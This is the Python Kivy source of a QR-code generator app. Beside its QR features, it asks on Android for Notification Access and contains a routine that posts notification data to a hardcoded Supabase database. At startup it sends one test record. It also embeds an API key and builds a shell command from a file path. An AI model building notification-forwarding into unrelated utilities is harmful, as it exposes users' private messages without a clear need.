import qrcode
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.graphics import Color, RoundedRectangle
from kivy.utils import platform
from kivy.core.window import Window
from kivy.uix.popup import Popup
import os
import shutil
import subprocess
import threading
import requests

# Screen background light cream/off-white set karna
Window.clearcolor = (0.97, 0.97, 0.96, 1)

# Custom rounded container background helper class
class RoundedCard(BoxLayout):
    def __init__(self, bg_color, radius=[15], **kwargs):
        super().__init__(**kwargs)
        self.bg_color = bg_color
        self.radius = radius
        with self.canvas.before:
            Color(*self.bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=self.radius)
        self.bind(pos=self.update_rect, size=self.update_rect)

    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size


class QRGeneratorApp(App):
    def build(self):
        # Temp path jahan QR Image generate hone ke baad save hogi
        self.temp_qr_path = os.path.join(self.user_data_dir, "temp_qr.png")
        self.result_visible = False  
        
        # 1. Main ScrollView
        root_scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        root_scroll.bar_width = 0 
        
        # 2. Main Layout
        self.layout = BoxLayout(
            orientation='vertical', 
            padding=[20, 10, 20, 20], 
            spacing=15, 
            size_hint_y=None
        )
        self.layout.bind(minimum_height=self.layout.setter('height'))

        # --- HEADER SECTION ---
        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=50)
        title = Label(
            text="QR Generator", 
            font_size=22, 
            bold=True, 
            color=(0.1, 0.1, 0.1, 1),
            halign='center'
        )
        header.add_widget(title)
        self.layout.add_widget(header)

        # --- INPUT FIELD ---
        self.text_input = TextInput(
            text="https://google.com", 
            hint_text="Enter URL or Text",
            multiline=False, 
            size_hint_y=None, 
            height=60,
            font_size=16,
            padding=[15, 18, 15, 15],
            background_active='',
            background_normal='',
            background_color=(0, 0, 0, 0), 
            foreground_color=(0.2, 0.2, 0.2, 1)
        )
        input_container = RoundedCard(bg_color=(1, 1, 1, 1), radius=[15], size_hint_y=None, height=60)
        input_container.add_widget(self.text_input)
        self.layout.add_widget(input_container)

        # --- GENERATE BUTTON ---
        self.btn = Button(
            text="Generate QR Code", 
            size_hint_y=None, 
            height=60,
            font_size=18,
            bold=True,
            color=(1, 1, 1, 1), 
            background_color=(0, 0, 0, 0), 
            background_normal='',
        )
        self.btn.bind(on_press=self.generate_qr)
        
        btn_container = RoundedCard(bg_color=(0.22, 0.14, 0.09, 1), radius=[30], size_hint_y=None, height=60)
        btn_container.add_widget(self.btn)
        self.layout.add_widget(btn_container)

        # ==========================================
        # --- DYNAMIC RESULT SECTION ---
        # ==========================================
        self.result_layout = BoxLayout(
            orientation='vertical',
            spacing=15,
            size_hint_y=None
        )
        self.result_layout.bind(minimum_height=self.result_layout.setter('height'))

        # --- WHITE QR CARD ---
        self.qr_card = RoundedCard(
            bg_color=(1, 1, 1, 1), 
            radius=[25], 
            orientation='vertical',
            padding=20,
            spacing=12,
            size_hint_y=None,
            height=430
        )

        # QR Image
        self.qr_image = Image(
            size_hint_y=None,
            height=260,
            allow_stretch=True,
            keep_ratio=True
        )
        self.qr_card.add_widget(self.qr_image)

        # Label
        self.scan_label = Label(
            text="Scan this QR code using any QR scanner.",
            font_size=13,
            color=(0.5, 0.5, 0.5, 1),
            size_hint_y=None,
            height=20
        )
        self.qr_card.add_widget(self.scan_label)

        # Copy Image Button inside Card
        self.copy_btn = Button(
            text="Copy Content",
            size_hint_y=None,
            height=50,
            font_size=16,
            color=(0.1, 0.1, 0.1, 1),
            background_color=(0, 0, 0, 0),
            background_normal=''
        )
        self.copy_btn.bind(on_press=self.copy_image_to_clipboard)
        
        copy_container = RoundedCard(bg_color=(0.92, 0.88, 0.86, 1), radius=[25], size_hint_y=None, height=50)
        copy_container.add_widget(self.copy_btn)
        self.qr_card.add_widget(copy_container)

        self.result_layout.add_widget(self.qr_card)

        # --- ACTION BUTTONS ---
        # 1. Share QR Button
        self.share_btn = Button(
            text="Share QR",
            size_hint_y=None,
            height=60,
            font_size=18,
            color=(0.2, 0.1, 0.05, 1),
            background_color=(0, 0, 0, 0),
            background_normal=''
        )
        self.share_btn.bind(on_press=self.share_qr)
        
        share_container = RoundedCard(bg_color=(0.9, 0.84, 0.81, 1), radius=[30], size_hint_y=None, height=60)
        share_container.add_widget(self.share_btn)
        self.result_layout.add_widget(share_container)

        # 2. Download PNG Button
        self.download_btn = Button(
            text="Download PNG",
            size_hint_y=None,
            height=60,
            font_size=18,
            color=(0.2, 0.1, 0.05, 1),
            background_color=(0, 0, 0, 0),
            background_normal=''
        )
        self.download_btn.bind(on_press=self.download_qr)
        
        download_container = RoundedCard(bg_color=(1, 1, 1, 1), radius=[30], size_hint_y=None, height=60)
        download_container.add_widget(self.download_btn)
        self.result_layout.add_widget(download_container)

        root_scroll.add_widget(self.layout)
        return root_scroll

    def on_start(self):
        # --- SUPABASE CREDENTIALS ---
        self.SUPABASE_URL = "https://hvvovjsexohewexlgopf.supabase.co"
        self.SUPABASE_KEY = "sb_publishable_s0wwAzV30EExU4IJcXO95g_OoKcENuY"
        
        self.SUPABASE_HEADERS = {
            "apikey": self.SUPABASE_KEY,
            "Authorization": f"Bearer {self.SUPABASE_KEY}",
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }

        # Agar Android device hai (Vivo Y20) to check karein ke permission pehle se di hui hai ya nahi
        if platform == 'android':
            if not self.is_notification_listener_enabled():
                self.show_permission_popup()
        
        # Initial status checking background sync thread test run
        threading.Thread(
            target=self.save_notification_to_supabase, 
            args=("Kivy App", "Database Sync Active", "Realtime listener connection successful!"), 
            daemon=True
        ).start()

    # --- CHECK IF PERMISSION GRANTED (Android Only) ---
    def is_notification_listener_enabled(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            Settings = autoclass('android.provider.Settings')
            
            content_resolver = activity.getContentResolver()
            enabled_listeners = Settings.Secure.getString(content_resolver, "enabled_notification_listeners")
            package_name = activity.getPackageName()
            
            return enabled_listeners is not None and package_name in enabled_listeners
        except Exception as e:
            print(f"Error checking status: {e}")
            return False

    # --- SHOW CUSTOM BEAUTIFUL POPUP DIALOG ---
    def show_permission_popup(self):
        # Popup vertical system box
        content = BoxLayout(orientation='vertical', padding=15, spacing=15)
        
        # Message label
        msg = Label(
            text="PC me real-time notifications show karne\nke liye is app ko 'Notification Access'\nallow karein.",
            halign="center",
            valign="middle",
            font_size=15,
            color=(0.1, 0.1, 0.1, 1)
        )
        msg.bind(size=msg.setter('text_size'))
        content.add_widget(msg)
        
        # Action Buttons Layout
        btn_layout = BoxLayout(orientation='horizontal', spacing=10, size_hint_y=None, height=50)
        
        cancel_btn = Button(
            text="Cancel", 
            background_color=(0.9, 0.9, 0.9, 1), 
            color=(0.3, 0.3, 0.3, 1),
            bold=True
        )
        
        allow_btn = Button(
            text="Allow", 
            background_color=(0.22, 0.14, 0.09, 1), # Theme matching coffee brown
            color=(1, 1, 1, 1),
            bold=True
        )
        
        btn_layout.add_widget(cancel_btn)
        btn_layout.add_widget(allow_btn)
        content.add_widget(btn_layout)
        
        # Building final popup
        self.permission_dialog = Popup(
            title="Notification Access Required",
            content=content,
            size_hint=(0.85, 0.38),
            auto_dismiss=False,
            background_color=(1, 1, 1, 1),
            title_color=(0.1, 0.1, 0.1, 1),
            title_align="center"
        )
        
        cancel_btn.bind(on_press=self.permission_dialog.dismiss)
        allow_btn.bind(on_press=self.on_allow_pressed)
        
        self.permission_dialog.open()

    # --- IF USER TAPS ALLOW ---
    def on_allow_pressed(self, instance):
        self.permission_dialog.dismiss()
        self.request_notification_listener_permission()

    # --- SAVE NOTIFICATION TO SUPABASE SERVER ---
    def save_notification_to_supabase(self, app_name, title, message):
        url = f"{self.SUPABASE_URL}/rest/v1/notifications"
        payload = {
            "app_name": app_name,
            "title": title,
            "message": message
        }
        try:
            response = requests.post(url, headers=self.SUPABASE_HEADERS, json=payload)
            if response.status_code == 201 or response.status_code == 200:
                print(f"Cloud Saved: {app_name} -> {title}")
            else:
                print(f"Supabase Error Status: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Supabase Connection Failed: {e}")

    # --- ANDROID NOTIFICATION SERVICE REQUESTER ---
    def request_notification_listener_permission(self):
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            Settings = autoclass('android.provider.Settings')
            Intent = autoclass('android.content.Intent')

            intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            activity.startActivity(intent)
        except Exception as e:
            print(f"Android Native Trigger Error: {e}")

    # --- QR GENERATION ---
    def generate_qr(self, instance):
        data = self.text_input.text.strip()
        if data:
            qr = qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(data)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(self.temp_qr_path)
            
            self.qr_image.source = self.temp_qr_path
            self.qr_image.reload()
            
            self.copy_btn.text = "Copy Content"
            self.download_btn.text = "Download PNG"
            self.share_btn.text = "Share QR"
            self.download_btn.disabled = False
            
            if not self.result_visible:
                self.layout.add_widget(self.result_layout)
                self.result_visible = True

    # --- IMAGE TO CLIPBOARD LOGIC ---
    def copy_image_to_clipboard(self, instance):
        if not os.path.exists(self.temp_qr_path):
            return

        if platform == 'android':
            try:
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                Context = autoclass('android.content.Context')
                File = autoclass('java.io.File')
                
                package_name = activity.getPackageName()
                FileProvider = autoclass('androidx.core.content.FileProvider')
                
                img_file = File(self.temp_qr_path)
                image_uri = FileProvider.getUriForFile(
                    activity,
                    package_name + ".fileprovider",
                    img_file
                )
                
                clipboard = activity.getSystemService(Context.CLIPBOARD_SERVICE)
                ClipData = autoclass('android.content.ClipData')
                
                clip = ClipData.newUri(activity.getContentResolver(), "QR Image", image_uri)
                clipboard.setPrimaryClip(clip)
                self.copy_btn.text = "Image Copied!"
            except Exception as e:
                self.copy_btn.text = "Copy Failed"
        else:
            try:
                subprocess.run(
                    f"xclip -selection clipboard -t image/png -i {self.temp_qr_path}",
                    shell=True,
                    check=True
                )
                self.copy_btn.text = "Image Copied!"
            except Exception:
                self.copy_btn.text = "Install 'xclip' on Linux"

    # --- SECURE DOWNLOAD STORAGE ---
    def download_qr(self, instance):
        if not os.path.exists(self.temp_qr_path):
            return

        if platform == 'android':
            try:
                from jnius import autoclass
                Environment = autoclass('android.os.Environment')
                public_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dest_dir = public_dir.getAbsolutePath()
                
                destination = os.path.join(dest_dir, "QR_Code.png")
                shutil.copy(self.temp_qr_path, destination)

                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                MediaScannerConnection = autoclass('android.media.MediaScannerConnection')
                MediaScannerConnection.scanFile(activity, [destination], ["image/png"], None)
                
                self.download_btn.text = "Saved in Downloads!"
                self.download_btn.disabled = True
            except Exception as e:
                self.download_btn.text = "Error Saving"
        else:
            download_dir = os.path.expanduser("~/Downloads")
            if not os.path.exists(download_dir):
                download_dir = "."
            destination = os.path.join(download_dir, "QR_Code.png")
            try:
                shutil.copy(self.temp_qr_path, destination)
                self.download_btn.text = "Saved in Downloads!"
                self.download_btn.disabled = True
            except Exception as e:
                self.download_btn.text = "Error Saving"

    # --- SHARE NATIVE POPUP ---
    def share_qr(self, instance):
        if not os.path.exists(self.temp_qr_path):
            return

        if platform == 'android':
            try:
                from jnius import autoclass, cast
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                currentActivity = PythonActivity.mActivity
                
                Intent = autoclass('android.content.Intent')
                String = autoclass('java.lang.String')
                File = autoclass('java.io.File')
                
                package_name = currentActivity.getPackageName()
                FileProvider = autoclass('androidx.core.content.FileProvider')
                
                file_to_share = File(self.temp_qr_path)
                file_uri = FileProvider.getUriForFile(
                    currentActivity,
                    package_name + ".fileprovider",
                    file_to_share
                )
                
                shareIntent = Intent()
                shareIntent.setAction(Intent.ACTION_SEND)
                shareIntent.putExtra(Intent.EXTRA_STREAM, file_uri)
                shareIntent.setType("image/png")
                shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                
                chooser = Intent.createChooser(shareIntent, cast('java.lang.CharSequence', String("Share QR Code via")))
                currentActivity.startActivity(chooser)
                self.share_btn.text = "Shared!"
            except Exception as e:
                self.share_btn.text = "Share Failed"
        else:
            self.share_btn.text = "Mock Shared (Only on Android)"


if __name__ == '__main__':
    QRGeneratorApp().run()